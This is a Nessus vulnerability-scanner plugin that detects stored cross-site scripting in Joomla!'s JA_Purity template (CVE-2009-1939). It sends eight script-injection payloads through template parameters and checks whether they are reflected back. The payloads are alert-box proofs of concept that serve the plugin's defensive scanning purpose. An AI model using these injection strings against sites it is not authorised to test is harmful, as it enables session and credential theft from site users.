#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(39331);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2009-1939");
  script_bugtraq_id(35189);
  script_xref(name:"OSVDB", value:"54870");
  script_xref(name:"Secunia", value:"35278");

  script_name(english:"Joomla! JA_Purity Template Multiple Cross-Site Scripting Vulnerabilities");
  script_summary(english:"Attempts a XSS attack");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "The remote web server contains a PHP application that is affected by\n",
      "multiple cross-site scripting vulnerabilities."
    )
  );
  script_set_attribute(
    attribute:"description",
    value:string(
      "The version of Joomla! installed on the remote host has multiple\n",
      "persistent cross-site scripting vulnerabilities in the JA_Purity\n",
      "template.  Injected HTML or script code is stored in the user's\n",
      "cookie, making the attack persistent for the entire session.\n",
      "A remote attacker could leverage this to trick an unsuspecting user\n",
      "into requesting a malicious URL, which could be used to steal\n",
      "credentials.\n\n",
      "Note that this version of Joomla! has other cross-site scripting\n",
      "vulnerabilities that Nessus has not tested for."
    )
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://archives.neohapsis.com/archives/bugtraq/2009-06/0065.html"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://developer.joomla.org/security/news/296-20090602-core-japurity-xss.html"
  );
  script_set_attribute(
    attribute:"solution",
    value:"Upgrade to Joomla! version 1.5.11 or later."
  );
  script_set_attribute(
    attribute:"cvss_vector",
    value:"CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N"
  );
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl", "cross_site_scripting.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);

install = get_kb_item(string("www/", port, "/joomla"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^.+ under (/.*)$");
if (isnull(matches)) exit(0);
joomla_dir = matches[1];

# data used in generating XSS attempts
cookie = make_array("Cookie", "ja_purity_tpl=ja_purity");
unreserved = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.!~*()-]/?=&";

function attempt_xss(params, expected_output)
{
  local_var xss, url, res, success, pattern;
  success = FALSE;
  xss = urlencode(str:params, unreserved:unreserved);

  clear_cookiejar();

  url = string(joomla_dir, "/index.php?template=ja_purity&", xss);
  res = http_send_recv3(method:"GET", item:url, port:port, add_headers:cookie);
  if (isnull(res)) exit(0);

  if (expected_output >< res[2]) success = TRUE;

  return success;
}

# There are several vectors for XSS in the affected versions of Joomla!
exploits = make_list(
  'theme_header="><script>alert("' + SCRIPT_NAME + '");</script>',
  'theme_background="><script>alert("' + SCRIPT_NAME + '");</script>',
  'theme_elements="><script>alert("' + SCRIPT_NAME + '");</script>',
  'logoType=1&logoText=<script>alert("' + SCRIPT_NAME + '");</script>',
  'logoType=1&sloganText=<script>alert("' + SCRIPT_NAME + '");</script>',
  "excludeModules=';alert('" + SCRIPT_NAME + "'); var b='",
  "rightCollapseDefault=';alert('" + SCRIPT_NAME + "'); var b='",
  'ja_font="><script>alert("' + SCRIPT_NAME + '");</script>'
);

# The expected outputs of a successful xss attack (with some context).
# Each entry has a corresponding entry in the 'exploits' list.
output = make_list(
  '"><script>alert("' + SCRIPT_NAME + '");</script>/style.css"',
  '"><script>alert("' + SCRIPT_NAME + '");</script>/style.css"',
  '"><script>alert("' + SCRIPT_NAME + '");</script>/style.css"',
  '<span><script>alert("' + SCRIPT_NAME + '");</script></span>',
  '<p class="site-slogan"><script>alert("' + SCRIPT_NAME + '");</script></p',
  "var excludeModules='';alert('" + SCRIPT_NAME + "'); var b='';",
  "var rightCollapseDefault='';alert('" + SCRIPT_NAME + "'); var b='';",
  'class="fs"><script>alert("' + SCRIPT_NAME + '");</script> IE6" >'
);

working_exploits = make_list();

# Each vector will be tested if thorough tests are enabled. Otherwise, only
# one will be tested
if (thorough_tests)
{
  for (i = 0; i < max_index(exploits); i++)
    if (attempt_xss(params:exploits[i], expected_output:output[i]))
      working_exploits = make_list(working_exploits, exploits[i]);
}
else
{
  if (attempt_xss(params:exploits[0], expected_output:output[0]))
    working_exploits = make_list(working_exploits, exploits[0]);
}

if (max_index(working_exploits) > 0)
{
  set_kb_item(name:'www/'+port+'/XSS', value:TRUE);

  if (report_verbosity > 0)
  {
    report = '\nNessus was able to detect this issue using the following URL(s) :\n\n';

    foreach exploit (working_exploits)
    {
      encoded_xss = urlencode(str:exploit, unreserved:unreserved);
      url = string(joomla_dir, "/index.php?template=ja_purity&", encoded_xss);
      report += string("  ", build_url(port:port, qs:url), "\n");
    }

    report += string(
      "\nNote that this issue only affects browsers that accept cookies.\n",
      "To successfully test one of the proof-of-concepts listed above,\n",
      "it may be necessary to visit the URL once (to obtain a cookie), and\n",
      "then refresh the page (to trigger the cross-site scripting issue).\n"
    );

    security_warning(port:port, extra:report);
  }
  else security_warning(port);
}
